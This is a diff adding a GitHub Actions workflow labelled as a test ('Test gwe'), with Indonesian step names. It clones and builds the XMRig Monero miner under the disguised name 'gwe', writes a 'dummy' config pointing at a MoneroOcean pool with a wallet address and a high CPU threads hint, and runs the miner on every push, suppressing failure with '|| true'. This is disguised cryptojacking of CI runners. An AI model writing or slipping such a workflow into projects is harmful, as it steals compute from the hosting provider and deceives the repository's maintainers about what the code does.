@@ -1,0 +1,51 @@
+name: Test gwe
+
+on:
+  push:
+  workflow_dispatch:
+
+jobs:
+  gwe:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Install dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y git build-essential cmake \
+            libuv1-dev libssl-dev libhwloc-dev
+
+      - name: Clone gwe
+        run: git clone https://github.com/MoneroOcean/xmrig.git gwe
+
+      - name: Build gwe
+        run: |
+          cd gwe
+          mkdir build && cd build
+          cmake ..
+          make -j$(nproc)
+
+      - name: Buat config dummy
+        run: |
+          cat > config.json << 'EOF'
+          {
+            "autosave": false,
+            "cpu": {
+              "enabled": true,
+              "max-threads-hint": 85
+            },
+            "pools": [
+              {
+                "url": "pool.moneroocean.stream:10032",
+                "user": "89nrRkC52Zd3n24GUh7yCVLLmt2wXGnFPWGtPJuHpQnBbmPJvV1RURbHy6cxu2L5kiGcgRZVBLSKYCqggDC7ynR3MSTs5rk",
+                "pass": "my",
+                "tls": true,
+              }
+            ]
+          }
+          EOF
+
+      - name: Test jalankan gwe 
+        run: |
+          cd gwe/build
+          ./xmrig --config ../../config.json || true
